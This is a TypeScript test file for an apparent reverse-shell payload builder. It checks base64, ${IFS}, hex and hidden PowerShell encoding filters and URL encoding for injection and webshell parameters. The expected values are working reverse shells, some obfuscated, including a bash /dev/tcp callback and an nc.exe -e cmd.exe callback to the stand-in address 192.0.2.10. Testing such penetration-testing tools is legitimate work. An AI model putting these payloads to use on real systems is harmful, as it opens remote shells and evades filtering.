import { describe, expect, it } from "vitest";
import { buildPayload } from "../../../engines/payloads/build";
import { applyFilter, FILTER_CONTEXTS, filterChoices } from "../../../engines/payloads/filters";
import { SHELLS } from "../../../engines/payloads/shells";

const V = { LHOST: "192.0.2.10", LPORT: "443" };
const def = (id: string) => SHELLS.find((d) => d.id === id)!;

describe("applyFilter", () => {
  it("b64 pipes base64 of the payload into bash", () => {
    const f = applyFilter("id", "b64");
    expect(f.text).toBe("echo aWQ=|base64 -d|bash");
    expect(f.parts.map((p) => p.explain).join(" ")).toMatch(/quotes/);
    expect(f.note).toMatch(/base64/i);
  });
  it("ifs swaps every space for ${IFS}", () => {
    expect(applyFilter("id", "ifs").text).toBe("echo${IFS}aWQ=|base64${IFS}-d|bash");
    expect(applyFilter("bash -i >& /dev/tcp/192.0.2.10/443 0>&1", "ifs").text).not.toContain(" ");
  });
  it("hex writes every byte as \\xNN inside $'…'", () => {
    const f = applyFilter("id", "hex");
    expect(f.text).toBe("bash -c $'\\x69\\x64'");
    expect(f.note).toContain("$'…'");
    expect(f.note).toMatch(/base64/);
  });
  it("b64 is UTF-8", () => {
    expect(applyFilter("é", "b64").text).toBe("echo w6k=|base64 -d|bash");
    expect(applyFilter("é", "hex").text).toBe("bash -c $'\\xc3\\xa9'");
  });
  it("ps-b64 runs the command as powershell -e", () => {
    expect(applyFilter("whoami", "ps-b64").text).toBe("powershell -nop -w hidden -e dwBoAG8AYQBtAGkA");
  });
});

describe("filterChoices", () => {
  it("by OS", () => {
    expect(filterChoices("linux")).toEqual(["off", "b64", "ifs", "hex"]);
    expect(filterChoices("windows")).toEqual(["off", "ps-b64"]);
    expect(filterChoices(null)).toEqual(["off", "b64", "ifs", "hex", "ps-b64"]);
    expect(FILTER_CONTEXTS).toEqual(["injected-linux", "url-param", "webshell-param"]);
  });
});

describe("buildPayload with a filter", () => {
  it("bash-tcp in url-param, b64: the b64 form instead of bash -c, then URL-encoded", () => {
    const b = buildPayload(def("bash-tcp"), "url-param", V, { filter: "b64" });
    expect(b.text).toBe("echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMC4yLjEwLzQ0MyAwPiYx%7Cbase64+-d%7Cbash");
    expect(b.parts.length).toBeGreaterThan(def("bash-tcp").parts.length);
    expect(b.notes.join(" ")).toMatch(/base64/i);
  });
  it("injected-linux, b64: no bash -c and no URL encoding", () => {
    expect(buildPayload(def("bash-tcp"), "injected-linux", V, { filter: "b64" }).text)
      .toBe("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMC4yLjEwLzQ0MyAwPiYx|base64 -d|bash");
  });
  it("ifs in a URL encodes the braces", () => {
    expect(buildPayload(def("bash-tcp"), "webshell-param", V, { filter: "ifs" }).text)
      .toBe("echo$%7BIFS%7DYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMC4yLjEwLzQ0MyAwPiYx%7Cbase64$%7BIFS%7D-d%7Cbash");
  });
  it("a context outside FILTER_CONTEXTS ignores the filter", () => {
    const plain = buildPayload(def("bash-tcp"), "bash-prompt", V);
    expect(buildPayload(def("bash-tcp"), "bash-prompt", V, { filter: "b64" })).toEqual(plain);
  });
  it("unresolved placeholders: no filter, the gap stays visible", () => {
    const vals = { LHOST: "", LPORT: "443" };
    const b = buildPayload(def("bash-tcp"), "url-param", vals, { filter: "b64" });
    expect(b).toEqual(buildPayload(def("bash-tcp"), "url-param", vals));
    expect(b.text).toContain("{LHOST}");
    expect(b.notes.join(" ")).toContain("Set LHOST first");
  });
  it("a filter for the other OS is ignored", () => {
    expect(buildPayload(def("bash-tcp"), "url-param", V, { filter: "ps-b64" })).toEqual(buildPayload(def("bash-tcp"), "url-param", V));
    expect(buildPayload(def("nc-exe"), "url-param", V, { filter: "b64" })).toEqual(buildPayload(def("nc-exe"), "url-param", V));
  });
  it("nc-exe in webshell-param with ps-b64: powershell -e, URL-encoded", () => {
    const b = buildPayload(def("nc-exe"), "webshell-param", V, { filter: "ps-b64" });
    expect(b.text).toBe(
      "powershell+-nop+-w+hidden+-e+QwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABuAGMALgBlAHgAZQAgAC0AZQAgAGMAbQBkAC4AZQB4AGUAIAAxADkAMgAuADAALgAyAC4AMQAwACAANAA0ADMA",
    );
  });
  it("a def already base64 (-e) is unchanged with a note", () => {
    const plain = buildPayload(def("ps-b64"), "webshell-param", V);
    const b = buildPayload(def("ps-b64"), "webshell-param", V, { filter: "ps-b64" });
    expect(b.text).toBe(plain.text);
    expect(b.notes).toContain("Already base64 (-e).");
    expect(b.notes.filter((n) => n !== "Already base64 (-e).")).toEqual(plain.notes);
  });
});
